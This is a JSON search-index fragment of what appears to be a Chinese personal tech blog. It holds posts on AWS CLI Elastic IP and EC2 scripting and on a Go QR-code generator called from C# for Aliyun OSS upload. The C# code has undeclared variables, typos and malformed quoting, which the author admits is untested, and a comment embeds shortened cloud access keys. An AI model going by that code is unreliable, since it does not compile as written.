test\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e时间:\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003edate +\u003cspan class=\"s2\"\u003e\u0026#34;%F %T\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u0026gt;.msg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat .msg\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eddmsg \u003cspan class=\"s2\"\u003e\u0026#34;`cat .msg`\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"钉钉告警发送"},{"content":"客户发了一个需求如下：\n用shell 或者python3 控制aws去获取新IP、绑定IP到实例 这个就非常简单了，因为本身aws就提供python的工具，一切都可以api化的\n做法如下：\n#安装aws的工具 cd /tmp curl -kL \u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34; -o \u0026#34;awscliv2.zip\u0026#34; unzip awscliv2.zip sudo ./aws/install aws --version #配置aws key aws configure #查看配置 aws configure list ---------------------------- #申请一个新IP并且打tag aws ec2 allocate-address --region $Region |tee /tmp/eip.log eip_id=$(jq -r \u0026#34;.AllocationId\u0026#34; /tmp/eip.log) aws ec2 create-tags --resources ${eip_id} --tags Key=Name,Value=eip-01 eip=$(jq -r \u0026#34;.PublicIp\u0026#34; /tmp/eip.log) #给ec2赋ip，前提是知道ec2_id aws ec2 associate-address --instance-id ${ec2_id} --allocation-id ${eip_id} ---------------------------- #启动新ec2的方法： #启动ec2 aws ec2 run-instances \\ --region $Region --count 1 \\ --instance-type t2.micro \\ --subnet-id ${lan_a_public_id} \\ --security-group-ids $gid \\ --key-name MySshKey \\ --image-id ami-04ff9e9b51c1f62ca \\ |tee /tmp/ec2.log ec2_id=$(jq -r \u0026#34;.Instances[0].InstanceId\u0026#34; /tmp/ec2.log) 参考： https://www.cnblogs.com/elvi/p/16542406.html\n","permalink":"https://rendoumi.com/posts/20221123-freelancer_aws/","summary":"\u003cp\u003e客户发了一个需求如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e用shell 或者python3 控制aws去获取新IP、绑定IP到实例\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e这个就非常简单了，因为本身aws就提供python的工具，一切都可以api化的\u003c/p\u003e\n\u003cp\u003e做法如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-c#\" data-lang=\"c#\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#安装\u003c/span\u003e\u003cspan class=\"n\"\u003eaws的工具\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecd\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003ecurl\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ekL\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eo\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;awscliv2.zip\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eunzip\u003c/span\u003e \u003cspan class=\"n\"\u003eawscliv2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ezip\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003esudo\u003c/span\u003e \u003cspan class=\"p\"\u003e./\u003c/span\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003einstall\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eversion\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#配置\u003c/span\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003ekey\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003econfigure\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#查看配置\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003econfigure\u003c/span\u003e \u003cspan class=\"n\"\u003elist\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e----------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#申请一个新\u003c/span\u003e\u003cspan class=\"n\"\u003eIP并且打tag\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003eallocate\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eaddress\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eregion\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"n\"\u003eRegion\u003c/span\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003etee\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eeip_id\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejq\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;.AllocationId\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003ecreate\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003etags\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eresources\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eeip_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003etags\u003c/span\u003e \u003cspan class=\"n\"\u003eKey\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eName\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"n\"\u003eValue\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"m\"\u003e01\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejq\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;.PublicIp\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eeip\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#给\u003c/span\u003e\u003cspan class=\"n\"\u003eec2赋ip\u003c/span\u003e\u003cspan class=\"err\"\u003e，前提是知道\u003c/span\u003e\u003cspan class=\"n\"\u003eec2_id\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003eassociate\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eaddress\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eec2_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eallocation\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003eeip_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e----------------------------\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#启动新\u003c/span\u003e\u003cspan class=\"n\"\u003eec2的方法\u003c/span\u003e\u003cspan class=\"err\"\u003e：\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"err\"\u003e#启动\u003c/span\u003e\u003cspan class=\"n\"\u003eec2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eaws\u003c/span\u003e \u003cspan class=\"n\"\u003eec2\u003c/span\u003e \u003cspan class=\"n\"\u003erun\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003einstances\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eregion\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"n\"\u003eRegion\u003c/span\u003e \u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003einstance\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003etype\u003c/span\u003e \u003cspan class=\"n\"\u003et2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003emicro\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003esubnet\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"n\"\u003elan_a_public_id\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003esecurity\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003egroup\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eids\u003c/span\u003e \u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"n\"\u003egid\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"n\"\u003eMySshKey\u003c/span\u003e \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e--\u003c/span\u003e\u003cspan class=\"n\"\u003eimage\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003eid\u003c/span\u003e \u003cspan class=\"n\"\u003eami\u003c/span\u003e\u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"m\"\u003e04f\u003c/span\u003e\u003cspan class=\"n\"\u003ef9e9b51c1f62ca\u003c/span\u003e  \\\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \u003cspan class=\"p\"\u003e|\u003c/span\u003e\u003cspan class=\"n\"\u003etee\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eec2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"n\"\u003eec2_id\u003c/span\u003e\u003cspan class=\"p\"\u003e=\u003c/span\u003e\u003cspan class=\"err\"\u003e$\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ejq\u003c/span\u003e \u003cspan class=\"p\"\u003e-\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;.Instances[0].InstanceId\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003etmp\u003c/span\u003e\u003cspan class=\"p\"\u003e/\u003c/span\u003e\u003cspan class=\"n\"\u003eec2\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003elog\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch5 id=\"参考\"\u003e参考：\u003c/h5\u003e\n\u003cp\u003e\u003ca href=\"https://www.cnblogs.com/elvi/p/16542406.html\"\u003ehttps://www.cnblogs.com/elvi/p/16542406.html\u003c/a\u003e\u003c/p\u003e","title":"Freelancer之aws"},{"content":"客户发了一个需求如下：\nTODO: 在sortFiles中，获取最新的域名，生成二维码，覆盖QRCodePath图片 TODO:将QRCodePath图片上传到阿里云0S根目录，重复则覆盖 又具体询问了一下细节，是一个 csharp 的程序\nvar sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime);\r// TODO: 在sortFiles中，获取最新的域名（文件名去掉.zip就是域名），结合logoUrl生成二维码，覆盖QRCodePath图片\r// TODO: 将QRCodePath图片上传到阿里云OOS根目录，重复则覆盖， 看了一下，觉得思路如下，这是个管道流，无论徒手写代码生成QRCODE(还有个logo图需要放到二维码中央)，还是集成OSS的SDK都麻烦\n最快速方法是直接调用外部成程序做这两步，第一步用Go写个程序生成二维码，第二步用阿里的ossutil64工具上传\n一、Go程序Gen出QRCode go 有很多库，我们直接拿来用好了，但是基本上都是老代码，所以需要下载 go1.13.15 来用\n# 下载go 1.13.15，解压到E:\\go，并建立一个E:\\go\\go-work目录，下载的模块会放到这里\rhttps://dl.google.com/go/go1.13.15.windows-amd64.zip\r# 设置三个变量\rGOROOT=E:\\go\rGOPATH=E:\\go\\go-work\rPATH中增加好E:\\go\\bin的目录\r# 设置一下代理，有时候模块拉不下来\rgo env -w GOPROXY=https://goproxy.cn,direct 然后就准备gen qrcode的程序，main.go\npackage main\rimport (\r\u0026#34;flag\u0026#34;\r\u0026#34;image\u0026#34;\r\u0026#34;image/draw\u0026#34;\r\u0026#34;image/jpeg\u0026#34;\r_ \u0026#34;image/png\u0026#34;\r\u0026#34;os\u0026#34;\r\u0026#34;path/filepath\u0026#34;\r\u0026#34;github.com/LyricTian/logger\u0026#34;\r\u0026#34;github.com/nfnt/resize\u0026#34;\r\u0026#34;github.com/skip2/go-qrcode\u0026#34;\r)\rvar (\rtext string\rlogo string\rpercent int\rsize int\rout string\r)\rfunc init() {\rflag.StringVar(\u0026amp;text, \u0026#34;t\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;二维码内容\u0026#34;)\rflag.StringVar(\u0026amp;logo, \u0026#34;l\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;二维码Logo(png)\u0026#34;)\rflag.IntVar(\u0026amp;percent, \u0026#34;p\u0026#34;, 15, \u0026#34;二维码Logo的显示比例(默认15%)\u0026#34;)\rflag.IntVar(\u0026amp;size, \u0026#34;s\u0026#34;, 256, \u0026#34;二维码的大小(默认256)\u0026#34;)\rflag.StringVar(\u0026amp;out, \u0026#34;o\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;输出文件\u0026#34;)\r}\rfunc main() {\rflag.Parse()\rif text == \u0026#34;\u0026#34; {\rlogger.Fatalf(\u0026#34;请指定二维码的生成内容\u0026#34;)\r}\rif out == \u0026#34;\u0026#34; {\rlogger.Fatalf(\u0026#34;请指定输出文件\u0026#34;)\r}\rif exists, err := checkFile(out); err != nil {\rlogger.Fatalf(\u0026#34;检查输出文件发生错误：%s\u0026#34;, err.Error())\r} else if exists {\rlogger.Fatalf(\u0026#34;输出文件已经存在，请重新指定\u0026#34;)\r}\rcode, err := qrcode.New(text, qrcode.Highest)\rif err != nil {\rlogger.Fatalf(\u0026#34;创建二维码发生错误：%s\u0026#34;, err.Error())\r}\rsrcImage := code.Image(size)\rif logo != \u0026#34;\u0026#34; {\rlogoSize := float64(size) * float64(percent) / 100\rsrcImage, err = addLogo(srcImage, logo, int(logoSize))\rif err != nil {\rlogger.Fatalf(\u0026#34;增加Logo发生错误：%s\u0026#34;, err.Error())\r}\r}\routAbs, err := filepath.Abs(out)\rif err != nil {\rlogger.Fatalf(\u0026#34;获取输出文件绝对路径发生错误：%s\u0026#34;, err.Error())\r}\ros.MkdirAll(filepath.Dir(outAbs), 0777)\routFile, err := os.Create(outAbs)\rif err != nil {\rlogger.Fatalf(\u0026#34;创建输出文件发生错误：%s\u0026#34;, err.Error())\r}\rdefer outFile.Close()\rjpeg.Encode(outFile, srcImage, \u0026amp;jpeg.Options{Quality: 100})\rlogger.Infof(\u0026#34;二维码生成成功，文件路径：%s\u0026#34;, outAbs)\r}\rfunc checkFile(name string) (bool, error) {\r_, err := os.Stat(name)\rif err != nil {\rif os.IsNotExist(err) {\rreturn false, nil\r}\rreturn false, err\r}\rreturn true, nil\r}\rfunc resizeLogo(logo string, size uint) (image.Image, error) {\rfile, err := os.Open(logo)\rif err != nil {\rreturn nil, err\r}\rdefer file.Close()\rimg, _, err := image.Decode(file)\rif err != nil {\rreturn nil, err\r}\rimg = resize.Resize(size, size, img, resize.Lanczos3)\rreturn img, nil\r}\rfunc addLogo(srcImage image.Image, logo string, size int) (image.Image, error) {\rlogoImage, err := resizeLogo(logo, uint(size))\rif err != nil {\rreturn nil, err\r}\roffset := image.Pt((srcImage.Bounds().Dx()-logoImage.Bounds().Dx())/2, (srcImage.Bounds().Dy()-logoImage.Bounds().Dy())/2)\rb := srcImage.Bounds()\rm := image.NewNRGBA(b)\rdraw.Draw(m, b, srcImage, image.ZP, draw.Src)\rdraw.Draw(m, logoImage.Bounds().Add(offset), logoImage, image.ZP, draw.Over)\rreturn m, nil\r} 上面很简单，用到了别人的三个模块，需要安装一下\ngo get -u github.com/LyricTian/logger@latest go get -u github.com/nfnt/resize@latest go get -u github.com/skip2/go-qrcode@latest 注意，这些命令是针对 go 1.13.15 的，如果用高版本的，命令是不一样的\n然后就编译\ngo build -o qr.exe main.go 找个中心图，然后测试\nE:\\qr\\qr.exe -h Usage of qr: -l string 二维码Logo(png) -o string 输出文件 -p int 二维码Logo的显示比例(默认15%) (default 15) -s int 二维码的大小(默认256) (default 256) -t string 二维码内容 E:\\qr\\qr.exe -t \u0026#34;http://www.zz.ha.cn\u0026#39; -l logo.png -o qr.png 就会生成二维码图像\n二、用ossutils64.exe上传OSS 这个就简单了，下载阿里的工具，大概是这个样子\nossutil64.exe --config-file oss.conf cp 上传文件 s3://桶名/\u0026#34;; 三、整合进csharp 这步也比较麻烦，涉及到csharp的单独语法\nvar sortFiles = Directory.GetFiles(zipPath, \u0026#34;*.zip\u0026#34;).Select(fn =\u0026gt; new FileInfo(fn)).OrderBy(f =\u0026gt; f.LastAccessTime); // TODO: 在sortFiles中，获取最新的域名（文件名去掉.zip就是域名），结合logoUrl生成二维码，覆盖QRCodePath图片 for (int i = 0; i \u0026lt; sortFiles.Length; ++i) { sortFiles[i] = Path.GetFileNameWithoutExtension(sortFiles[i]); System.Diagnostics.Process process = new System.Diagnostics.Process(); System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; startInfo1.FileName = \u0026#34;qr.exe\u0026#34;; string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); startInfo1.Arguments = param01; process.StartInfo = startInfo1; process.Start(); // TODO: 将QRCodePath图片上传到阿里云OOS根目录，重复则覆盖，AccessKey ID: LTAI5bbbb AccessKey Secret: NZPwtssss System.Diagnostics.Process process = new System.Diagnostics.Process(); System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo(); startInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden; startInfo1.FileName = \u0026#34;ossutil64.exe\u0026#34;; startInfo1.Arguments = \u0026#34;--config-file oss.conf cp sortFiles[i] s3:///\u0026#34;; string parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); process.StartInfo = startInfo1; process.Start(); } 关键点有两个：\n1、获取sortFiles有后缀，需要去掉\nfor (int i = 0; i \u0026lt; sortFiles.Length; ++i) {\rsortFiles[i] = Path.GetFileNameWithoutExtension(sortFiles[i]);\r} 2、要执行命令，需要后台执行\nSystem.Diagnostics.Process process = new System.Diagnostics.Process();\rSystem.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();\rstartInfo1.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;\rstartInfo1.FileName = \u0026#34;qr.exe\u0026#34;;\rstring parm01 = string.Format(\u0026#34;-t {0} -o {1} -l {2}\u0026#34;, sorFiles[i], sortFiles[i], logoUrl\u0026#34;); startInfo1.Arguments = param01;\rprocess.StartInfo = startInfo1;\rprocess.Start(); 这样就搞完了，但是，没真机测试啊，go和oss的部分没问题，csharp的部分没有真机，无法验证。\n","permalink":"https://rendoumi.com/posts/20221123-freelancer_qrcode/","summary":"\u003cp\u003e客户发了一个需求如下：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-shell\" data-lang=\"shell\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTODO: 在sortFiles中，获取最新的域名，生成二维码，覆盖QRCodePath图片\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eTODO:将QRCodePath图片上传到阿里云0S根目录，重复则覆盖\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e又具体询问了一下细节，是一个 csharp 的程序\u003c/p\u003e\n\u003cpre 